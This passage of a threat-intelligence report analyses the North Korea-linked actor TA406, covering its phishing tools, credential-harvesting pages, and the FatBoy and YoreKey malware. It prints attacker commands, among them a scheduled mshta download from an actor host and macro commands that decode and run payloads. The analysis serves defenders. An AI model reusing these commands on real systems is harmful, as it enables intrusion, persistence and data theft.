However, two notable 2021 campaigns attributed to this  group attempted to distribute malware that could be used for information gathering.\n\n • TA406 engages in espionage, cyber crime and sextortion.\n\n## Overview\n\n###### Throughout 2021, Proofpoint has tracked ongoing credential theft campaigns from TA406, an actor associated with the Democratic People’s Republic of Korea (DPRK). Our analysts have tracked TA406 campaigns targeting customers since 2018, but the threat actor’s campaigns remained low in volume until the beginning of January 2021. From January through June 2021, Proofpoint observed almost weekly campaigns targeting foreign policy experts, journalists and nongovernmental organizations (NGOs). \n\n\n-----\n\n## Introduction\n\n###### In this report, we describe in detail many of the campaigns and behaviors associated with an actor operating on behalf of the North Korean government: TA406. (See Figure 1.)\n\n We begin by explaining how TA406 is associated with Kimsuky, a threat actor name broadly tracked by the threat intelligence community. We then elaborate on how Proofpoint tracks the activity of TA406 as three separate threat actors—TA406, TA408 and TA427. Also, we detail the differences between these actors, based on Proofpoint’s visibility.\n\n This report also examines campaign timing and targeting by TA406, and it provides a look into how TA406 conducts phishing campaigns, including the tools and services used.\n\n TA406 employs both malware and credential harvesting in espionage and information-gathering campaigns. This report details several examples of each, including different types of credential collection and two implants used by TA406 that haven’t been discussed before in open-source reporting. And finally, like all other North Korean state-sponsored actors that Proofpoint tracks, we provide evidence that TA406 conducts financially motivated campaigns, including the targeting of cryptocurrency and sextortion.\n\n**Figure 1. TA406 activity diagram**\n\n\n-----\n\n## Threat Actor Details\n\n###### Proofpoint assesses with high confidence that TA406 operates on behalf of the North Korean government. DPRK threat actors are difficult to classify definitively, and different security firms, government entities and threat researchers all use their own frameworks and visibility to conduct attribution. Proofpoint’s unique visibility provides the ability to track and classify actors based on several different methods, including, but not limited to, targeting, account use, infrastructure, malicious tools and other operator behaviors.\n\n### TA406 attribution\n\nProofpoint doesn’t associate TA406 with other publicly known groups. The activity tracked as TA406 by Proofpoint is often\n[referred to publicly as Kimsuky, Thallium and Konni Group. For most researchers and vendors, including Proofpoint, TA406](https://attack.mitre.org/groups/G0094/)\nfalls under the Kimsuky umbrella.\n\n[Kimsuky was first named publicly by Kaspersky in research published in 2013. Much like Lazarus Group, the actor name](https://securelist.com/the-kimsuky-operation-a-north-korean-apt/57915/)\n“Kimsuky” has developed into a catchall name for numerous clusters of activity. While Proofpoint broadly agrees that TA406\nlikely has organizational ties to what Kaspersky and other threat researchers have tracked as Kimsuky, visibility into operator\nbehavior and patterns of targeting allows Proofpoint to cluster activity groups tracked as Kimsuky more granularly into three\ndistinct threat actor groups (TA406, TA408 and TA427) and several unidentified actors.\n\nTable 1 provides an overview of the types of organizations that each named actor under the Kimsuky umbrella targets with\nphishing campaigns, based on Proofpoint’s visibility.\n\n###### Kimsuky: A Visualization of the Umbrella\n\n\n**TA406** **TA408** **TA427**\n\n\n**Foreign policy experts** X X X\n\n**Academic institutions** X X X\n\n**NGOs** X X\n\n**International governmental organizations (IGOs)** X X\n\n**Government agencies** X X\n\n**Law enforcement agencies** X\n\n**Military organizations** X\n\n**Media (e.g., journalists)** X\n\n**Cryptocurrency** X X\n\n**Pharmaceutical companies** X\n\n**Finance and economic-related businesses and institutions** X X\n\n**Defense and DIB organizations** X\n\n**Table 1. Differences in targeting and victimology via phishing attacks, based on Proofpoint’s visibility**\n\n\n-----\n\n### TA406\n\n[TA406 has conducted espionage-motivated campaigns since at least 2012 and financially motivated campaigns since at](https://www.fireeye.com/blog/threat-research/2012/12/to-russia-with-apt.html)\n[least 2018. TA406 is known to use spear-phishing messages to deliver both malware and credential harvesting campaigns.](https://unit42.paloaltonetworks.com/unit42-the-fractured-block-campaign-carrotbat-malware-used-to-deliver-malware-targeting-southeast-asia/)\n[TA406 has used many different malware families, including KONNI, SANNY, CARROTBAT/CARROTBALL, BabyShark,](https://blog.talosintelligence.com/2017/05/konni-malware-under-radar-for-years.html)\n**[Amadey and Android Moez.](https://blog.alyac.co.kr/2308)**\n\nTA406 has had access to BabyShark since at least early 2019; however, based on our visibility, this actor was not the original\nuser of BabyShark. TA406 may have discontinued the use of BabyShark sometime in mid-to-late 2019, while TA427 has used\nBabyShark in intrusions as recently as October 2021.\n\nIn 2019, a suspected TA406 operator uploaded several files to VirusTotal (NavRAT, QuasarRAT and BabyShark downloader).\n[One of those files was a CHM payload that contained commented out code from a campaign associated with AppleJeus and](https://www.virustotal.com/gui/file/acffd1ea8a7ae49c89835fd28f8d0d938482e146467fff629e1e6608cde8902d/detection)\nworking code that would have likely downloaded a BabyShark variant (see Figure 2).\n\n**Figure 2: HTML from CHM file with working TA406 code and commented out AppleJeus-related code**\n\nProofpoint analysts were unable to find the original CHM, which suggests that TA406 may have had access to tools and code\n[used by the actor associated with AppleJeus. TA406’s short-lived use of BabyShark that took place after TA427’s first use of](https://securelist.com/operation-applejeus/87553/)\nBabyShark also suggests that TA406 has or had access to tools and code developed by TA427. Another explanation is that\nTA406 may share or has previously shared tool development resources with TA427.\n\n### TA408\n\nTA408 has been observed targeting Proofpoint customers much less often than TA406 and TA427. TA408 uses both\ncredential harvesting and malware campaigns. Based on files uploaded to malicious file repositories, TA408 often targets\norganizations and individuals in East Asia.\n\nIn 2020, TA408 targeted at least one pharmaceutical company with a World Health Organization (WHO) COVID-19-themed\nemail. TA408 also conducts financially motivated campaigns, such as a Hyundai Pay-themed Kasse/Hdac wallet campaign\nobserved in 2020.\n\n[Like TA406, TA408 uses Android malware to achieve certain goals. Rather than write completely new malware, as TA406](https://mp.weixin.qq.com/s/8RgFvA_rOR2nIGxjWbEq-w)\n[did for Android Moez, TA408 ported AppleSeed to Android. TA408’s AppleSeed malware was recently described in detail by](https://vb2020.vblocalhost.com/uploads/VB2020-46.pdf)\n[S2W researchers in a VB2021 paper.](https://vblocalhost.com/uploads/VB2021-Kim-etal.pdf)\n\n\n-----\n\n### TA427\n\n[TA427 may be best known for its use of browser extensions (STOLEN PENCIL) and HTA-based malware (BabyShark).](https://www.netscout.com/blog/asert/stolen-pencil-campaign-targets-academia)\nTA427 uses credential harvesting, spear-phishing campaigns, infrastructure-scanning tools, and various tools and exploits\n[leaked by the hacker group, The Shadow Brokers.](https://en.wikipedia.org/wiki/The_Shadow_Brokers)\n\nAs recently as October 2021, TA427 was still using BabyShark, QuasarRAT, PCRat, browser extensions (Chrome, Edge and\nFirefox), and numerous PowerShell scripts (keylogging, exfiltration of emails and more). Based on Proofpoint’s visibility,\nTA427 first used BabyShark by no later than November 2018. Before that, by no later than June 2017, TA427 started using\nMSHTA to download unknown HTA malware.\n\nTA427, by no later than January 2020, also started to conduct long-running, benign campaigns to build rapport with targets.\nThese campaigns often begin by asking the target to participate in an interview or answer a questionnaire and finally\ncompromises the target by asking them to review changes they have made by clicking a URL or opening an attachment. In\nsome cases, these conversations spanned hundreds of days before TA427 sent a malicious URL or attachment to attempt to\ncompromise the victim.\n\nTA427 is not known by Proofpoint to conduct many financially motivated campaigns. The cryptocurrency miner XMRig has\nbeen staged in the past on a command and control (C&C) server by TA427, but it was never confirmed if actors deployed it in\nthe wild.\n\nAlso, one version of TA427’s Chrome extension targeted blockchain[.]com users. Initially the malicious Chrome extension\ntargeted military, government, North Korean domestic and humanitarian topics. But sometime in early 2020, the externally\nloaded JavaScript code was modified to target blockchain.com users (see Figure 3). Based on debug logs collected by\nTA427 operator(s), the browser extension C&C was beaconed to more than 180,000 unique IP addresses.\n\n**Figure 3. TA427 Chrome extension with redacted military, government and humanitarian organization targeting (left, 2019),**\n**which was later modified for blockchain.com user targeting (right, 2020)**\n\n\n-----\n\n### Campaign timing\n\nThe TA406 and TA427 operators responsible for conducting phishing campaigns appear to have a similar workday schedule\n(see Figure 4). Based on a time zone of +9 GMT, it seems the operators work roughly from 9 a.m. to 5 p.m., with an\noccasional late worknight. Both sets of operators may take breaks in the middle of the day, although Proofpoint’s visibility\nsuggests that TA427 operators take a much longer break. Also, throughout 2021, TA427 sent more emails outside of normal 8\na.m. to 5 p.m. business hours than TA406.\n\n###### TA406 – 2021 Time of Day Frequency Analysis\n\n**Figure 4. TA406 and TA427 time-of-day frequency analysis**\n\nSome observations can be made regarding what days of the week both TA406 and TA427 operators work (Figure 5). TA406\noperators appear to work from Monday to Saturday, mostly; however, at least two campaigns in 2021 were conducted on\nSunday. TA427 sent fewer phishing emails on a Saturday than did TA406 however more on a Sunday.\n\nThis data shows that the operators associated with TA406 and TA427 don’t have a standard Monday-to-Friday workweek and,\nsometimes, they may be either required or willing to work every day of the week.\n\n\n-----\n\n###### TA406 – 2021 Time of Week Frequency Analysis\n\n**Figure 5. TA406 and TA427 day-of-week frequency analysis**\n\n### Targeting\n\nTA406 conducts credential-phishing campaigns that target experts at political and foreign policy organizations and NGOs,\nespecially those who are working with or are experts on activities that impact the Korean Peninsula, including nuclear\nnonproliferation. TA406 also targets academics and journalists.\n\nGenerally, TA406 phishing campaigns focus on individuals in North America, Russia and China, with the actors frequently\nmasquerading as Russian diplomats and academics, representatives of the Ministry of Foreign Affairs of the Russian\nFederation, human rights officials, or Korean individuals. TA406 has also targeted individuals and organizations related to\ncryptocurrency for the purpose of financial gain.\n\nOne campaign in 2021 conducted by TA406 had drastically different targeting than normal for unknown reasons. The\ncampaign occurred around the same time as the March 2021 North Korean missile tests and targeted several organizations\nand individuals not previously observed as targets for TA406. The recipients of that campaign included some of the highestranking elected officials of several different governmental institutions, an employee at a consulting firm, government\ninstitutions related to defense, law enforcement, and economy and finance, and generic mailboxes for board and customer\nrelations of a large financial institution.\n\nSuch diverse and high-profile targeting is unusual for TA406 and the timing of this campaign which coincided with prominent\nmissile testing, may have been a political signal rather than an intent to collect credentials. On the other hand, TA406 and\nother actors associated with DPRK are opportunistic and would likely capitalize on stolen credentials if any of the recipients\nor organizations had fallen victim to the campaign.\n\nBefore 2021, Proofpoint had observed limited credential-capture campaigns using national security or human rights themes.\nTA406 was also one of the first threat actors to use coronavirus themes (see Figure 6), appearing in Proofpoint data before\nnearly every other criminal or advanced persistent threat (APT) in February 2020.\n\n\n-----\n\n**Figure 6. TA406 government-themed website purporting to distribute coronavirus information impacting the Korean peninsula**\n\nIn early 2021, TA406 began almost weekly campaigns featuring themes that included nuclear weapon safety, U.S. President Joe\nBiden, Korean foreign policy and other political themes. The group attempted to collect credentials, such as Microsoft logins\nor other corporate credentials, from the targeted individuals. In some cases, the emails were benign in nature; these messages\nmay have been attempts by the attackers to engage with victims before sending them a malicious link or attachment.\n\n### TA406 TTPs\n\nTA406 uses its own registered and controlled infrastructure to host credential capture web pages and malicious documents,\nand a limited number of legitimate, compromised websites as infrastructure. TA406 uses Gmail, Yandex and Mail[.]ru email\naccounts masquerading as legitimate government or nonprofit entities to distribute lures. TA406 also uses custom messagesending tools such as Star and a PHP-based PHPMailer tool.\n\nTA406 uses URLs in phishing emails linking to the SendGrid email delivery service that redirect to an attacker-controlled\ndomain hosting the malicious payload or a credential-harvesting page. SendGrid is an email marketing platform used for\nlegitimate business purposes and is often allowed to bypass email security filters; many threat actors use this type of redirect\nbehavior to appear legitimate.\n\nTA406 email threat campaigns appear to focus primarily on corporate credential capture. However, Proofpoint identified\nmultiple recent malware campaigns that may have had information-gathering objectives. Historic campaigns likely associated\nwith TA406 have distributed Remote Access Trojans (RATs) likely used in data theft and reconnaissance operations including\nKONNI, SANNY and CARROTBAT.\n\n\n-----\n\n## Phishing Tools and Techniques\n\n###### Proofpoint analysts have observed TA406 using several different methods and legitimate services  for sending out attacks. Among the go-to tactics for TA406 are employing a PHPMailer tool with various custom PHP interfaces and using attacker-registered email accounts with various free email service providers.\n\n### PHPMailer\n\nProofpoint analysts have observed TA406 using at least two different custom PHP web interfaces to facilitate sending\nphishing messages with PHPMailer. The older version that TA406 was known to use required no password to access the web\ninterface and supported sending emails via PHPMailer Version 5.2.7.\n\nThis tool provides a simple interface (see Figure 7) for operators to use for sending phishing messages either directly with\nan account registered with a free email service such as Yandex or through email marketing services such as SendGrid and\nSendinblue. TA406 has used the PHPMailer tool for sending phishing messages since at least 2019.\n\n**Figure 7. User interface for TA406’s custom PHPMailer tool**\n\n\n-----\n\nA more recent version of the PHPMailer interface was protected with a simple authentication prompt, as Figure 8 shows.\nAdlso, the code for the user interface was significantly changed from the older version of the PHPMailer tool. In the newer\nversion, CSS was moved to its own file instead of inline CSS, as was the case with the older version.\n\n**Figure 8. PHPMailer tool authentication prompt**\n\nAnother difference is support for toggling between sending emails via PHP’s Mail() function (see Figure 9) and PHPMailer\nVersion 5.2.9 (see Figure 10). TA406 actively uses this version of PHPMailer, including in attacks as recent as October 2021.\n\n**Figure 9. PHPMailer Mail() interface**\n\n\n-----\n\n**Figure 10. PHPMailer SMTP interface**\n\n[In addition to SendGrid, TA406 has used the PHPMailer tool to send messages using Sendinblue, Elastic Email and](https://www.sendinblue.com)\n**[Mandrill, as well as with actor-registered accounts via services such as Yandex and Mail[.]ru. TA406 has used a version of](https://mandrillapp.com)**\nthis tool or an unknown tool with PHPMailer Version 5.2.14.\n\n\n-----\n\n### Star\n\n_Star is another PHP-based, email-sending tool that TA406 uses. Proofpoint refers to this tool as Star based on the “star 3.0”_\nHTTP title observed in some versions of the tool. The tool has also been observed with a star-send.php file name. Much like\nthe PHPMailer tool, Star’s purpose is to provide an easy-to-use web interface for an operator to send phishing emails. PEAR\n**[Mail 1.2.0b4 and Mail_Queue are used to assist with sending emails.](https://pear.php.net/package/Mail)**\n\nAt least one other DPRK actor that Proofpoint tracks—TA427—has used Star. However, there are slight variations between the\nversion of Star that TA406 has used versus what TA427 has been observed using. For example, one version of Star used by\nTA406 had a gray background, the time zone field was called Add-On and several fields were missing. (See Figure 11.)\n\n**Figure 11. Star interface used by TA406**\n\n\n-----\n\nAlso, a reference to snoopy was left as a comment in the code, as Figure 12 shows.\n\n**Figure 12. Code snippet from TA406’s version of Star with snoopy reference**\n\n\n-----\n\nTA406 has also used a version of Star (Figure 13) that is identical to a version that TA427 uses except for one small difference:\nthe HTTP title in TA406’s version is “victory” while TA427’s is “star 3.0”. The “victory” keyword is notable due to several instances\n[of the same or a similar word being used in activity that was publicly attributed by ESTsecurity to Konni Group and Kimsuky.](https://blog.alyac.co.kr/2347)\n\n[For example, the actor that Proofpoint tracks as TA408 has used “victory” as a password for b374k web shells as well as](https://blog.alyac.co.kr/2347)\n[Hostinger account passwords (victory123!@#). Victory was also observed as part of a GET request parameter that allowed](https://vblocalhost.com/uploads/VB2021-Kim-etal.pdf)\n[code execution on certain AppleSeed C&C servers. A suspected TA406 campaign has used the “victory” keyword in the](https://vblocalhost.com/uploads/VB2021-Kim-etal.pdf)\n[past in an Amadey campaign that included the file name victory.exe.](https://www.virustotal.com/gui/file/f521b34d4b330ffb42284dc267b154da670139b41c79fc05700ff515f13e9e14/detection)\n\n**Figure 13. TA406 Star tool with “victory” HTTP title**\n\n\n-----\n\nTA406 has used Star since at least 2019, while TA427 has used the tool since at least 2018. Although the “star 3.0” HTTP title\nin TA427’s version of the tool (Figure 14) suggests there may be earlier versions, Proofpoint analysts have not observed them.\n\n**Figure 14. TA427 Star tool with “star 3.0” HTTP title**\n\n\n-----\n\nAnother observation regarding Star is the use of a URL path and comments to a hostname with no TLD: hxxp[:]//star/mail/u/0/.\nThis may have been a device name the developer(s) used during the development or testing phase.\n\n[A similar observation was made in some of the oldest known samples associated with BabyShark, where the following URL](https://www.virustotal.com/gui/file/32d76a69044b112c574228e6ab182182c48cf40683b621d358ce7f1ce9b3e31c/submissions)\nwas used: hxxp[:]//ksi/000/spy/Jauur0.hta (see Figure 15).\n\n**Figure 15. ksi hostname observed in VBS from BabyShark related document**\n\n[The ksi pattern, shown in Figure 16, was also observed as part of a URI with one of the earliest known BabyShark C&C](https://www.virustotal.com/gui/file/dc425e93e83fe02da9c76b56f6fd286eace282eaad6d8d497e17b3ec4059020a/details)\nservers, christinadudley[.]com. This further suggests that the operator(s) associated with TA427 may have had a more\nsignificant role in the testing and/or development of BabyShark than the operator(s) associated with TA406.\n\n**Figure 16. /ksi/ URI path observed in a BabyShark-related document**\n\nLastly, a reference to “dinosaur” via the inclusion of the string “mydinosaurtime” (Figure 12) indicates the developer of Star\nmay have closer ties with TA427 than TA406; however, this is a low-confidence assessment. “Dinosaur” was mentioned in\n[the joint cybersecurity advisory labeled AA20-301A as behavior associated with Kimsuky. AA20-301A described activity and](https://us-cert.cisa.gov/ncas/alerts/aa20-301a)\nindicators of compromise (IoCs) that Proofpoint analysts track as TA406 and TA408. References to “dinosaur” and similar\nwords are observed more often in activity associated with the actor Proofpoint tracks as TA427.\n\n\n-----\n\n### Actor-registered accounts\n\nAnother method that TA406 uses for sending phishing messages is to register free email accounts using the identities of\nlegitimate people. This is another area where there is a behavioral overlap between TA406 and TA427 (Figure 17 ).\n\nTA406 tends to impersonate Russian citizens and government institutions; however, that’s not always the case. For example,\n[TA406 regularly impersonates Moon Chung-in, who is an adviser to President Moon Jae-in, a professor at Yonsei University](https://en.wikipedia.org/wiki/Moon_Chung-in)\nand the editor-in-chief of Global Asia.\n\nLike TA427, TA406 usually impersonates experts on North Korea, East Asia or foreign policy who work in academia or for\nan NGO. These attacker-registered accounts are used to send emails through both PHP-based tools and directly using the\nwebmail interfaces of each service.\n\nIt should be noted that, like TA427, TA406 has impersonated Eunjung Cho in phishing campaigns from late 2020 to early\n2021. Eunjung Cho is a journalist for Voice of America. Those messages were sent using the TA406-owned domain\nvoakoreas[.]com instead of attacker-registered accounts, as was the case with TA427’s impersonation of Eunjung Cho.\n\n**Figure 17. TA406 vs. TA427 impersonation chart.**\n\n\n-----\n\nTA406 may create fictional personas in addition to using impersonation.\n\nTA406 has been observed using the following email account for testing purposes: tomasjimy12@[redacted]. A suspicious\nLinkedIn account, /in/tomas-jimy-aa289a1a1, was found using the same name “tomas jimy” and listing this person’s\noccupation as “Researcher at Stanford University” (Figure 18). Also, several skills listed on the profile were written in Korean.\n\n**Figure 18. “tomas jimy” LinkedIn profile likely created by TA406.**\n\nIt’s still unknown if these accounts were used in any phishing campaigns. Proofpoint analysts could find no evidence\nsuggesting that “tomas jimy” is a real person, nor have we found any obvious connections to a real person with a similar name.\n\n\n-----\n\n## Credential-harvesting techniques\n\n###### TA406 uses custom credential-harvesting pages, Basic HTTP authentication and PHProxy to collect credentials. One custom credential-harvesting page that TA406 uses often is a PDF reader with a credential box pop-up.\n\n TA406 is also known to copy the targeted organization’s login page or use Zoom meeting themes to collect credentials. Below are examples of each type of credential-harvesting page.\n\n### Basic HTTP authentication\n\nMost campaigns that TA406 has used to target Proofpoint customers in 2021 employed Basic HTTP authentication to collect\ncredentials. Phishing emails using this type of credential harvesting don’t typically contain much text in the body of the email.\n\nSometimes, the phishing email from TA406 contained a short message, a URL and a signature of the person the operators\nwere pretending to be (Figure 19).\n\n**Figure 19. Phishing email with URL for credential harvesting via Basic HTTP authentication**\n\n\n-----\n\nWith Basic HTTP authentication credential harvesting, the C&C server first responds with a HTTP 301 redirect followed by a\n401 Unauthorized (Figure 20).\n\n**Figure 20. Packet capture of initial Basic HTTP authentication**\n\nThe target is then presented with a basic login prompt to collect corporate or personal account credentials, as Figure 21 shows.\n\n**Figure 21. Basic HTTP authentication credential harvesting prompt**\n\n\n-----\n\n### Custom credential-harvesting pages\n\nTA406 is known to use credential-harvesting pages tailored for the theme of the message and a PDF reader with a login\nprompt pop-up. One campaign in 2021 used a Biden administration theme to try and trick users into entering their corporate\ncredentials into the sign-up prompt (Figures 22 and 23).\n\n**Figure 22. Biden administration-themed email**\n\n**Figure 23. Security Forecast Report-themed credential-harvesting page**\n\n\n-----\n\nA different campaign in 2021 used a Zoom meeting invitation related to nuclear safety to try and trick users into signing up for\nthe meeting with their name, email address and password (see Figure 24).\n\n**Figure 24. Zoom meeting registration-themed credential-harvesting page**\n\n\n-----\n\nThroughout 2020 and 2021, TA406 has used a landing page that loads a PDF in the browser along with a box to collect\ncredentials (see Figures 25 and 26).\n\n**Figure 25. PDF.js reader with Russian language login prompt**\n\n**Figure 26. PDF.js reader with an English language login prompt**\n\n\n-----\n\nPotential victims may be lured into providing their personal or corporate credentials to access the PDF document (Figure 27).\n\n**Figure 27. PDF decoy document accessible after providing credentials**\n\n### PHProxy\n\nTA406, to collect credentials, has used PHProxy, which proxies network traffic from a victim to the targeted email service.\nTA406 has used PHProxy to target at least Yahoo, Gmail and Daum users. Campaigns may consist of tricking a target into\nclicking a URL to download a file but are presented with a login prompt first to access the file.\n\nAfter PHProxy detects a successful login, the target’s browser is redirected to download.php to download a decoy file (Figure 28).\n\n**Figure 28. Custom PHProxy used to redirect victim to decoy file after logging in**\n\n\n-----\n\nTA406 used this tactic in 2019, with lures related to cryptocurrency white papers and police notices about stolen\ncryptocurrency (Figure 29).\n\n**Figure 29. Decoy PDF related to a police investigation notice about stolen cryptocurrency**\n\n\n-----\n\n## Notable 2021 Malware Campaigns\n\n### March 2021\n\nIn March 2021, TA406 shifted from concentrating exclusively on credential-capture activities to distributing malware via email.\nMessages purported to be from Chad O’Carroll, a prominent DPRK foreign policy specialist and CEO/Managing Director of\nKorea Risk Group, and targeted North American entities (Figure 30). The campaign referenced the DPRK short-range cruise\nmissile tests that occurred on or around March 21, 2021.\n\n**Figure 30. Phishing message with URL to 7z archive containing the malicious executable**\n\nThe emails contained links to an attacker-controlled domain used to trick targets into downloading a 7z compressed archive.\nInside the 7z archive was an executable packed with UPX that masqueraded as an HTML file with a double extension (.html\nand .exe).\n\nAlthough the size of the executable (EXE) was about 72.5 megabytes (MB), it included a 72.4MB overlay made up completely\nof null bytes. The actual size of the malicious EXE without the overlay was relatively small—only 71 kilobytes (KB). Adding a\nlarge overlay to malicious EXEs is a common tactic used by many different threat actors to bypass certain file scanning or\nanti-virus products that may exclude scanning large files.\n\nUpon executing the EXE, two actions would occur. First, the following command would be executed to create a scheduled\n[task with a name of “Twitter Alarm” that executed every 15 minutes and used Mshta to download a payload from an actor-](https://attack.mitre.org/techniques/T1218/005/)\ncontrolled C&C server:\n\ncmd /c schtasks /create /sc minute /mo 15 /tn “Twitter Alarm” /tr “mshta\nhxxp://vscode-plug[.]c1[.]biz/index.php”\n\n\n-----\n\nSecond, the EXE opened a web browser to a PDF file of a legitimate NK News article hosted on the attacker’s C&C\ninfrastructure (Figure 31). The article referred to missile tests conducted by North Korea. This was used as a decoy to trick a\nvictim into thinking they had opened a HTML file rather than executing a malicious EXE.\n\n**Figure 31. Web browser opening malicious PDF using a legitimate NK News article about the March 21, 2021, missile tests**\n\nThe EXE terminated after creating the scheduled task and opening a web browser to the decoy PDF. By creating a scheduled\ntask, the attackers were able to deploy additional payloads in 15-minute intervals to any compromised devices. Proofpoint\nanalysts didn’t observe follow-on payloads, and the next stage of the attack is unknown.\n\nThis temporary departure from TA406’s typical threat behaviors identified by Proofpoint aligns closely with a KONNI malware\n[campaign observed in 2017. According to Cisco Talos, threat actors distributed the KONNI malware in a July 4, 2017,](https://blog.talosintelligence.com/2017/07/konni-references-north-korean-missile-capabilities.html)\n[campaign using missile theme lures, just one day after North Korea conducted a test missile launch. The threat actor](https://www.nytimes.com/2017/07/04/world/asia/north-korea-missile-test-icbm.html)\nsimilarly used a legitimate news article as a decoy document to drop malware.\n\nProofpoint can’t attribute both campaigns to the same threat actor. However, the similar techniques and themes used in these\ncampaigns suggest the threat actors are related.\n\n\n-----\n\n### June 2021\n\nProofpoint identified another email campaign from the same sender purporting to be a well-known foreign policy specialist.\nThe campaign attempted to distribute a downloader that Proofpoint refers to as FatBoy, named after the FatBoy.dll file name\nused in this campaign. (Figure 32).\n\n**Figure 32. FatBoy installation flow**\n\nThe messages contained an HTML attachment masquerading as a preview of an article, as shown in Figure 33.\n\n**Figure 33. Phishing message with HTML attachment**\n\n\n-----\n\nThe HTML attachment used a fake error message to trick the user into clicking the “Save on Disk” button to download a\ndocument from the attacker’s C&C server (Figure 34).\n\n**Figure 34. HTML attachment lure**\n\n\n-----\n\nIn addition to the button, the attachment used an invisible iframe to communicate with the attacker’s C&C server with the\nBase64 encoded alias of the target’s email address appended to the URL request (see Figure 35). This approach allows:\n\n- Each attachment to have a unique hash\n\n- The attacker(s) to see which recipient opened the attachment\n\n- The attacker(s) to collect the IP address of any device allowed to beacon to the C&C URL\n\n\n**Figure 35. HTML attachment showing button onclick code and invisible iframe; the [redacted] portion of the URL**\n**was the Base64 encoded email address of the target**\n\n\n-----\n\nClicking the “Save on Disk” button created an HTTP request to the attacker’s C&C server to download a malicious Word\ndocument with a macro and a poorly worded lure attempting to trick its targets into enabling content (see Figure 36).\n\n**Figure 36. Downloaded Word document with malicious macro**\n\nThe macro’s primary purpose was to execute several commands. These commands extract the next-stage payloads\nembedded in the Word document and then execute those payloads with a batch script. (See Figure 37 and Table 2.)\n\n**Figure 37. VBS macro in downloaded Word document**\n\n\n-----\n\n**Command** **Purpose**\n\n\n**cd /d %USERPROFILE%** Set current directory to %USERPROFILE%\n\n**findstr /b “TVNDR” “[path from** Use findstr to parse the Word document looking for the string “TVNDR” that\n**ActiveDocument.FullName]”>xtong.txt** follows a new line and then writes all following data to xtong.txt\n\n**certutil -decode -f xtong.txt xto.c** Use certutil to Base64 decode the data in xtong.txt and save to xto.c, which\nresulted in a CAB file being saved to xto.c\n\n**expand -f:* xto.c %USERPROFILE%** Use the expand command to extract the xto.c CAB file and save all the\nextracted files to %USERPROFILE%\n\n**chk** One of the extracted files from the xto.c CAB archive was a batch script named\nchk.bat; this command executes that batch script\n\n\n**Table 2. Commands executed in order by the VBS macro used in the downloaded Word document**\n\nAfter the macro executes, the seven files contained in the xto.c CAB file are extracted to the %USERPROFILE% directory:\nchk.bat, FatBoy32.dll, FatBoy64.dll, FatBoy.dtd, install.bat, wupelv32.dll and wupelv64.dll.\n\nThe chk.bat script starts the execution of these payloads by first checking for administrative privileges (net session > nul). If\nadministrative privileges are available, the script skips straight to executing either the wupelv32.dll DLL on x86 based systems\nor wupelv64.dll on x64 based systems (WUPELV DLLs).\n\nIf privileges aren’t available, the script checks if the system is Windows 10. The Num variable is set to 4 on Windows 10\nsystems, while Num would be set to 1 for all other OS versions. The WUPELV DLLs are executed with the EntryPoint entry\npoint name, the value saved to the Num variable and, finally, the following argument:\n\n/c %~dp0install[.]bat\n\nThe purpose of the WUPELV DLLs is to execute the install.bat script with elevated privileges either directly when privileges are\nalready available or using UAC bypass methods similar to those described in the following Malwarebytes research:\n[“New variant of Konni malware used in campaign targeting Russia.”](https://blog.malwarebytes.com/threat-intelligence/2021/08/new-variant-of-konni-malware-used-in-campaign-targetting-russia/)\n\nThe install.bat script (Figure 38) is responsible for moving malware files to the System32 directory, executing commands\nto create a malicious service named EdgeUpdate, starting the malicious service and cleaning up files used throughout this\nexecution process.\n\n**Figure 38. install.bat script used to execute implant and perform cleanup**\n\n\n-----\n\n### FatBoy analysis\n\nLike other TA406 first-stage implants, the FatBoy malware is a relatively small downloader at just 53KB in size with a very\nlarge overlay made up of all null bytes (85.8MB). When executed, FatBoy searches for a file in its host directory with its same\nfile name but a .dtd extension—in this case, FatBoy.dtd. This file is used to store the C&C URL and likely employed as an antianalysis technique. This is a common tactic used by TA406, where C&C information isn’t stored directly in the implant.\n\nFatBoy’s purpose is to attempt to download a CAB file from the C&C stored in FatBoy.dtd every 20 minutes. The C&C contains\na URI of /ball. The malware will extract files stored in the CAB file and execute them.\n\nDuring our analysis, Proofpoint researchers observed FatBoy successfully downloading a file from hxxp://softlay-ware[.]c1[.]\n_biz/ball. A single CAB file was downloaded, containing a batch script named ball.bat (Figure 39)._\n\n**Figure 39. ball.bat script used to pass the C&C URL during execution of the reconnaissance VBS**\n\n\n-----\n\nThis was used to execute a VBS script named df.vbs (Figure 40) designed to perform reconnaissance on\ncompromised device(s).\n\n**Figure 40 df.vbs – reconnaissance VBS downloaded by FatBoy**\n\n\n-----\n\nThe VBS script collected extensive information about the device; the information was then sent via an HTTP POST request to\nthe C&C server (Figure 41).\n\n_Figure 41. HTTP POST generated by df.vbs_\n\nTA406 operator(s) could theoretically use the initial reconnaissance script to identify interesting devices and then choose\nwhich infected device to upgrade to the next stage implant by changing the CAB file stored on the C&C server. Proofpoint\nobserved no other malware during our analysis of this specific campaign.\n\n\n-----\n\n## Notable TA406 Malware \n\n### YoreKey\n\nYoreKey is a simple Windows keylogger that stores its logs in a plain text file on the infected device. TA406 has used this\nmalware since at least May 2020. The real name the developer(s) gave to this malware is unknown, so Proofpoint named it\nYoreKey after all C&C URLs have used the /history/ directory and the main purpose of the malware is to record keystrokes.\n\nThe logs are stored using the following format: %TEMP%\\Log.%USERNAME%.bin and prepended with the following two\nbytes: |FF FE|.\n\nLogs are sent to the C&C server via HTTP POST requests where the first variable (t) in the client body is used to send the\nbase64 encoded %USERNAME%, while the second variable (c) is used to send the Base64 encoded content of the key log\n(Figure 42).\n\n_Figure 42. YoreKey keylogger sending key logs to the C&C server_\n\nSome versions of YoreKey install persistence using the following registry key: HKLM\\SOFTWARE\\Microsoft\\Windows\\\n_CurrentVersion\\Run\\[filename of exe]._\n\nSeveral different samples of YoreKey have appeared on VirusTotal. (See the IoC section on page 45.) However, it’s unclear\nhow those samples were delivered or if they’ve been used in the wild.\n\n\n-----\n\n[YoreKey was also observed via a TA406 dropper made to look like a legitimate MetaTrader 4 (MT4) installer (see Figure 43).](https://www.metatrader4.com/en)\nThe MT4-themed YoreKey dropper was downloaded from a TA406 C&C server and staged in a similar way as other files\ndelivered via URLs in phishing campaigns targeting Proofpoint customers.\n\n**Figure 43. MT4 Setup window; YoreKey is executing silently in the background**\n\n\n-----\n\nThe initial dropper, named mt4managre.exe, used a PDB path of: E:\\Work\\_Spyware\\VIRUS_2020\\Release\\Dropper_exe_\n_media.pdb._\n\nThe dropper can have a variable number of embedded payloads, which is defined by the last four bytes (DWORD) of the file\n(Figure 44).\n\n**Figure 44. YoreKey dropper encoded config and number of 